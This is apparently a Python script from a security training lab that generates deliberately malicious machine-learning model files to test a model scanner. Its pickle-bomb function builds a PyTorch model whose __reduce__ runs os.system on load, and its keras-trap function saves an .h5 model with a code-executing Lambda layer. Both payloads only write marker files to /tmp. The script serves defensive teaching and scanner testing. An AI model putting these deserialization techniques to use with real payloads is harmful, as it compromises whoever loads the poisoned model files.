#!/usr/bin/env python3
"""
Threat Model Generator for AIRS MLOps Lab -- Module 6: The Threat Zoo

Generates intentionally malicious model files for security scanning exercises.
These models contain SAFE payloads (marker files, not real exploits).

Usage:
    python scripts/create_threat_models.py pickle-bomb [--output DIR]
    python scripts/create_threat_models.py keras-trap [--output DIR]
    python scripts/create_threat_models.py format-comparison [--output DIR]
    python scripts/create_threat_models.py all [--output DIR]
    python scripts/create_threat_models.py all --scan  # Generate and scan each model

Subcommands:
    pickle-bomb       - PyTorch model with __reduce__ RCE payload (safe demo)
    keras-trap        - Keras model with malicious Lambda layer (CVE-2024-3660)
    format-comparison - Same model in pickle vs safetensors (side-by-side)
    all               - Run all generators

Options:
    --output DIR  Output directory (default: ./threat-models/)
    --scan        Auto-scan each generated model with AIRS after creation
"""

import argparse
import subprocess
import sys
from pathlib import Path

# ---------------------------------------------------------------------------
# Rich console setup
# ---------------------------------------------------------------------------
try:
    from rich.console import Console
    from rich.panel import Panel
    from rich.table import Table
    from rich import box
    console = Console()
    HAS_RICH = True
except ImportError:
    HAS_RICH = False

    class _FallbackConsole:
        """Minimal fallback when rich is not installed."""
        def print(self, *args, **kwargs):
            text = " ".join(str(a) for a in args)
            # Strip basic rich markup for readability
            import re
            text = re.sub(r"\[/?[^\]]+\]", "", text)
            print(text)

        def rule(self, title=""):
            print(f"\n{'=' * 60}")
            if title:
                print(f"  {title}")
            print(f"{'=' * 60}")

    console = _FallbackConsole()


# ---------------------------------------------------------------------------
# Dependency helpers
# ---------------------------------------------------------------------------

def _check_torch():
    """Return True if torch is importable."""
    try:
        import torch  # noqa: F401
        return True
    except ImportError:
        return False


def _check_tensorflow():
    """Return True if tensorflow is importable."""
    try:
        import tensorflow  # noqa: F401
        return True
    except ImportError:
        return False


def _check_safetensors():
    """Return True if safetensors is importable."""
    try:
        import safetensors  # noqa: F401
        return True
    except ImportError:
        return False


def _require(name: str, package: str, pip_name: str | None = None):
    """Print a clear error when a dependency is missing and exit."""
    pip_name = pip_name or package
    console.print(f"\n[bold red]Missing dependency:[/bold red] {name} ({package})")
    console.print(f"  Install with:  pip install {pip_name}")
    console.print("  Or:            pip install torch tensorflow safetensors  (all demos)\n")
    return False


# ---------------------------------------------------------------------------
# Subcommand: pickle-bomb
# ---------------------------------------------------------------------------

def create_pickle_bomb(output_dir: Path) -> list[Path]:
    """Create a PyTorch model with a __reduce__ exploit payload.

    The payload is SAFE -- it only writes a marker file to /tmp proving that
    code execution would occur during deserialization.

    Real-world precedent: baller423/goober2 (2024) -- reverse shell payload
    discovered by JFrog on HuggingFace Hub.
    """
    if not _check_torch():
        _require("PyTorch", "torch")
        return []

    import torch
    import torch.nn as nn
    import os

    console.print("\n[bold red]PICKLE BOMB[/bold red] -- PyTorch __reduce__ RCE Demonstration")
    console.print("=" * 60)

    console.print("""
[bold]How this attack works:[/bold]
  Python's pickle serializer calls __reduce__() during deserialization.
  Whatever callable __reduce__ returns gets executed -- meaning torch.load()
  on an untrusted .pkl file is equivalent to running arbitrary Python code.

[bold]This demonstration:[/bold]
  The payload writes a harmless marker file to /tmp/airs_caught_this.txt.
  In a real attack, this would be a reverse shell, credential stealer, or
  cryptocurrency miner.

[bold]What AIRS catches:[/bold]
  AIRS/ModelScan detects os.system in the pickle bytecode and flags it as
  CRITICAL severity -- blocking the model before it can execute.
""")

    # The malicious model class
    class PickleBomb(nn.Module):
        """A PyTorch model with an embedded pickle exploit.

        When loaded with torch.load(), Python's pickle deserialization
        calls __reduce__(), executing arbitrary code. This is the most
        common model supply chain attack vector.

        Real-world example: baller423/goober2 (2024) -- reverse shell payload
        """
        def __reduce__(self):
            # SAFE payload: writes a marker file (not a real exploit)
            return (os.system, ("echo 'AIRS_PICKLE_BOMB_DETECTED' > /tmp/airs_caught_this.txt",))

        def forward(self, x):
            return x

    output_dir.mkdir(parents=True, exist_ok=True)
    model_path = output_dir / "malicious_model.pkl"

    console.print(f"[yellow]Saving malicious model to:[/yellow] {model_path}")
    torch.save(PickleBomb(), str(model_path))

    # Also create a README explaining the threat
    readme_path = output_dir / "PICKLE_BOMB_README.md"
    readme_path.write_text(
        "# Pickle Bomb -- Educational Threat Model\n\n"
        "## What is this?\n\n"
        "This is a PyTorch model file (.pkl) containing a `__reduce__` exploit.\n"
        "When loaded with `torch.load()`, the pickle deserializer executes the\n"
        "embedded payload -- in this case, writing a marker file to `/tmp/`.\n\n"
        "## Why does this work?\n\n"
        "Python's `pickle` module calls `__reduce__()` during deserialization.\n"
        "Whatever callable it returns gets executed. This means `torch.load()`\n"
        "on an untrusted file is equivalent to running `python untrusted_script.py`.\n\n"
        "## Real-world examples\n\n"
        "- **baller423/goober2** (2024): Reverse shell payload on HuggingFace\n"
        "- **nullifAI campaign** (2025): Broken pickle format bypasses scanners\n"
        "- **100+ malicious models** discovered on HuggingFace by JFrog (2024)\n\n"
        "## AIRS Detection\n\n"
        "AIRS/ModelScan detects `os.system` in pickle bytecode and flags as CRITICAL.\n"
        "This is the primary detection capability of model file scanning.\n\n"
        "## Safe to load?\n\n"
        "**NO.** Even though the payload is benign (writes a text file), loading\n"
        "this model executes code. In production, NEVER use `torch.load()` on\n"
        "untrusted model files. Use `safetensors` format instead.\n"
    )

    console.print(f"[green]Created:[/green] {model_path} ({model_path.stat().st_size:,} bytes)")
    console.print(f"[green]Created:[/green] {readme_path}")
    return [model_path]


# ---------------------------------------------------------------------------
# Subcommand: keras-trap
# ---------------------------------------------------------------------------

def create_keras_trap(output_dir: Path) -> list[Path]:
    """Create a Keras model with a malicious Lambda layer.

    Demonstrates CVE-2024-3660: arbitrary code execution via Lambda layer
    deserialization in .h5 format Keras models.

    Real-world precedent: SFConvertbot incident (2024), HiddenLayer research.
    """
    if not _check_tensorflow():
        _require("TensorFlow", "tensorflow")
        return []

    import tensorflow as tf

    console.print("\n[bold red]KERAS TRAP[/bold red] -- Lambda Layer Code Execution (CVE-2024-3660)")
    console.print("=" * 60)

    console.print("""
[bold]How this attack works:[/bold]
  Keras Lambda layers can contain arbitrary Python code. When a model is
  saved in .h5 format, the Lambda function's source code is serialized.
  On model load, the code is deserialized and executed.

[bold]This demonstration:[/bold]
  The Lambda layer writes a marker file to /tmp/airs_keras_caught.txt.
  A real attacker would use this for credential exfiltration or backdoor
  installation.

[bold]CVE-2024-3660:[/bold]
  This vulnerability was assigned CVSS 9.8 (Critical). Keras 2.13+ added
  safe_mode=True by default for .keras v3 format, but .h5 files from
  older versions remain vulnerable.

[bold]What AIRS catches:[/bold]
  AIRS/ModelScan detects Lambda layers in .h5 files and flags them as
  HIGH-CRITICAL severity.
""")

    # Define the exploit Lambda function
    def exploit_lambda(x):
        """Malicious Lambda layer -- would execute on model load.

        Real-world: CVE-2024-3660, SFConvertbot incident (2024)
        """
        import os
        os.system("echo 'AIRS_KERAS_TRAP_DETECTED' > /tmp/airs_keras_caught.txt")
        return x

    output_dir.mkdir(parents=True, exist_ok=True)
    model_path = output_dir / "exploit_model.h5"

    console.print("[yellow]Building Keras model with malicious Lambda layer...[/yellow]")

    model = tf.keras.Sequential([
        tf.keras.layers.Input(shape=(64,)),
        tf.keras.layers.Dense(32, activation="relu"),
        tf.keras.layers.Lambda(exploit_lambda),
        tf.keras.layers.Dense(1),
    ])
    model.compile(optimizer="adam", loss="mse")

    console.print(f"[yellow]Saving exploit model to:[/yellow] {model_path}")
    model.save(str(model_path))

    # Also create a clean model for comparison
    clean_path = output_dir / "clean_keras_model.h5"
    clean_model = tf.keras.Sequential([
        tf.keras.layers.Input(shape=(64,)),
        tf.keras.layers.Dense(32, activation="relu"),
        tf.keras.layers.Dense(1),
    ])
    clean_model.compile(optimizer="adam", loss="mse")
    clean_model.save(str(clean_path))

    # README
    readme_path = output_dir / "KERAS_TRAP_README.md"
    readme_path.write_text(
        "# Keras Trap -- Lambda Layer Code Execution\n\n"
        "## What is this?\n\n"
        "Two Keras models saved in .h5 format:\n"
        "- `exploit_model.h5` -- Contains a malicious Lambda layer\n"
        "- `clean_keras_model.h5` -- Clean model without Lambda (for comparison)\n\n"
        "## CVE-2024-3660\n\n"
        "Keras Lambda layers can contain arbitrary Python code that executes on\n"
        "model load. CVSS 9.8 (Critical). Fixed in Keras 2.13+ (.keras v3 format\n"
        "with safe_mode=True), but .h5 files remain vulnerable.\n\n"
        "## AIRS Detection\n\n"
        "AIRS detects Lambda layers in .h5 files and flags HIGH-CRITICAL.\n"
        "The clean model will pass scanning; the exploit model will be flagged.\n"
    )

    console.print(f"[green]Created:[/green] {model_path} ({model_path.stat().st_size:,} bytes)")
    console.print(f"[green]Created:[/green] {clean_path} ({clean_path.stat().st_size:,} bytes)")
    console.print(f"[green]Created:[/green] {readme_path}")
    return [model_path, clean_path]


# ---------------------------------------------------------------------------
# Subcommand: format-comparison
# ---------------------------------------------------------------------------

def create_format_comparison(output_dir: Path) -> list[Path]:
    """Create the same model in pickle and safetensors for side-by-side comparison.

    Demonstrates why format choice is a security decision:
    - Pickle (.pkl) can embed arbitrary code via __reduce__
    - Safetensors (.safetensors) stores only tensor data -- no code execution possible

    Even a 'clean' pickle file has inherent risk because the format ALLOWS
    code execution. Safetensors eliminates this entire class of vulnerability.
    """
    if not _check_torch():
        _require("PyTorch", "torch")
        return []

    has_safetensors = _check_safetensors()
    if not has_safetensors:
        console.print("[yellow]Warning: safetensors not installed. Will create pickle only.[/yellow]")
        console.print("  Install with: pip install safetensors\n")

    import torch
    import torch.nn as nn

    console.print("\n[bold blue]FORMAT COMPARISON[/bold blue] -- Pickle vs Safetensors Side-by-Side")
    console.print("=" * 60)

    console.print("""
[bold]Why format matters:[/bold]
  Pickle-based formats (.pkl, .pt, .pth, .bin) can embed executable code.
  Even a "clean" pickle file uses a format that ALLOWS code injection.
  Safetensors stores only tensor data -- no code execution is possible.

[bold]This demonstration:[/bold]
  The same model weights saved in both formats. Scan results will differ:
  - .pkl: May flag inherent pickle risk (format allows code execution)
  - .safetensors: Clean scan (format cannot contain executable content)

[bold]Key insight:[/bold]
  Safetensors was created by HuggingFace specifically to solve this problem.
  It is 2-4x faster to load AND eliminates an entire class of vulnerability.
""")

    class CleanModel(nn.Module):
        """A simple, legitimate PyTorch model with no exploits."""
        def __init__(self):
            super().__init__()
            self.linear1 = nn.Linear(64, 32)
            self.relu = nn.ReLU()
            self.linear2 = nn.Linear(32, 1)

        def forward(self, x):
            x = self.linear1(x)
            x = self.relu(x)
            return self.linear2(x)

    output_dir.mkdir(parents=True, exist_ok=True)
    model = CleanModel()
    created = []

    # Save as pickle (inherent risk even without exploit)
    pkl_path = output_dir / "clean_model.pkl"
    console.print(f"[yellow]Saving pickle format:[/yellow] {pkl_path}")
    torch.save(model.state_dict(), str(pkl_path))
    created.append(pkl_path)
    console.print(f"[green]Created:[/green] {pkl_path} ({pkl_path.stat().st_size:,} bytes)")

    # Save as safetensors (safe by design)
    if has_safetensors:
        from safetensors.torch import save_file

        st_path = output_dir / "clean_model.safetensors"
        console.print(f"[yellow]Saving safetensors format:[/yellow] {st_path}")
        save_file(model.state_dict(), str(st_path))
        created.append(st_path)
        console.print(f"[green]Created:[/green] {st_path} ({st_path.stat().st_size:,} bytes)")

    # Summary table
    if HAS_RICH:
        table = Table(title="Format Comparison", box=box.ROUNDED)
        table.add_column("Format", style="bold")
        table.add_column("File")
        table.add_column("Size")
        table.add_column("Code Execution?")
        table.add_column("Risk Level")

        table.add_row(
            "Pickle (.pkl)",
            str(pkl_path.name),
            f"{pkl_path.stat().st_size:,} bytes",
            "[red]YES -- via __reduce__[/red]",
            "[red]CRITICAL[/red]",
        )
        if has_safetensors:
            table.add_row(
                "Safetensors (.safetensors)",
                str(st_path.name),
                f"{st_path.stat().st_size:,} bytes",
                "[green]NO -- tensor data only[/green]",
                "[green]VERY LOW[/green]",
            )

        console.print(table)

    # README
    readme_path = output_dir / "FORMAT_COMPARISON_README.md"
    readme_path.write_text(
        "# Format Comparison -- Pickle vs Safetensors\n\n"
        "## Files\n\n"
        "- `clean_model.pkl` -- PyTorch model in pickle format (CRITICAL risk)\n"
        "- `clean_model.safetensors` -- Same model in safetensors (VERY LOW risk)\n\n"
        "## Why this matters\n\n"
        "Both files contain identical model weights. The difference is the FORMAT:\n\n"
        "| Format | Code Execution? | Risk |\n"
        "|--------|----------------|------|\n"
        "| Pickle (.pkl) | YES -- __reduce__ can run arbitrary code | CRITICAL |\n"
        "| Safetensors | NO -- stores only tensor bytes + JSON metadata | VERY LOW |\n\n"
        "## Key takeaway\n\n"
        "Format choice is a security decision. Always prefer safetensors when possible.\n"
        "The HuggingFace ecosystem is migrating to safetensors as the default.\n"
    )
    console.print(f"[green]Created:[/green] {readme_path}")

    return created


# ---------------------------------------------------------------------------
# Auto-scan helper
# ---------------------------------------------------------------------------

def scan_model(model_path: Path):
    """Run AIRS scan on a model file using the scan_model.py CLI."""
    script = Path(__file__).resolve().parent.parent / "airs" / "scan_model.py"
    if not script.exists():
        console.print(f"[yellow]Scanner not found at {script} -- skipping scan[/yellow]")
        return

    console.print(f"\n[bold cyan]Scanning:[/bold cyan] {model_path}")
    try:
        result = subprocess.run(
            [sys.executable, str(script), "--model-path", str(model_path), "--warn-only"],
            capture_output=True,
            text=True,
            timeout=120,
        )
        if result.stdout:
            console.print(result.stdout)
        if result.stderr:
            console.print(f"[dim]{result.stderr}[/dim]")
        if result.returncode != 0:
            console.print(f"[yellow]Scanner exited with code {result.returncode}[/yellow]")
    except FileNotFoundError:
        console.print("[yellow]Python not found -- cannot run scanner[/yellow]")
    except subprocess.TimeoutExpired:
        console.print("[yellow]Scan timed out after 120 seconds[/yellow]")
    except Exception as e:
        console.print(f"[yellow]Scan error: {e}[/yellow]")


# ---------------------------------------------------------------------------
# CLI
# ---------------------------------------------------------------------------

def main():
    parser = argparse.ArgumentParser(
        description="Threat Model Generator for AIRS MLOps Lab -- Module 6: The Threat Zoo",
        formatter_class=argparse.RawDescriptionHelpFormatter,
        epilog="""
Examples:
  python scripts/create_threat_models.py pickle-bomb
  python scripts/create_threat_models.py all --output ./my-threats/
  python scripts/create_threat_models.py all --scan
        """,
    )

    subparsers = parser.add_subparsers(dest="command", help="Threat type to generate")

    # pickle-bomb
    pb = subparsers.add_parser("pickle-bomb", help="PyTorch model with __reduce__ RCE payload")
    pb.add_argument("--output", type=Path, default=Path("./threat-models/pickle-bomb"))

    # keras-trap
    kt = subparsers.add_parser("keras-trap", help="Keras model with malicious Lambda layer")
    kt.add_argument("--output", type=Path, default=Path("./threat-models/keras-trap"))

    # format-comparison
    fc = subparsers.add_parser("format-comparison", help="Same model in pickle vs safetensors")
    fc.add_argument("--output", type=Path, default=Path("./threat-models/format-comparison"))

    # all
    al = subparsers.add_parser("all", help="Generate all threat models")
    al.add_argument("--output", type=Path, default=Path("./threat-models"))

    # Global options
    for sp in [pb, kt, fc, al]:
        sp.add_argument("--scan", action="store_true", help="Auto-scan each generated model with AIRS")

    args = parser.parse_args()

    if not args.command:
        parser.print_help()
        sys.exit(1)

    console.print("\n[bold]AIRS MLOps Lab -- Module 6: The Threat Zoo[/bold]")
    console.print("[dim]Generating educational threat models for security scanning exercises[/dim]")
    console.print("[dim]All payloads are SAFE -- marker files only, no real exploits[/dim]\n")

    all_models: list[Path] = []

    if args.command in ("pickle-bomb", "all"):
        out = args.output / "pickle-bomb" if args.command == "all" else args.output
        models = create_pickle_bomb(out)
        all_models.extend(models)

    if args.command in ("keras-trap", "all"):
        out = args.output / "keras-trap" if args.command == "all" else args.output
        models = create_keras_trap(out)
        all_models.extend(models)

    if args.command in ("format-comparison", "all"):
        out = args.output / "format-comparison" if args.command == "all" else args.output
        models = create_format_comparison(out)
        all_models.extend(models)

    # Summary
    console.print(f"\n{'=' * 60}")
    console.print(f"[bold green]Generated {len(all_models)} threat model files[/bold green]")
    for m in all_models:
        console.print(f"  {m}")

    # Auto-scan if requested
    if getattr(args, "scan", False) and all_models:
        console.print(f"\n{'=' * 60}")
        console.print("[bold cyan]Running AIRS scans on generated models...[/bold cyan]")
        for model_path in all_models:
            scan_model(model_path)

    console.print()


if __name__ == "__main__":
    main()
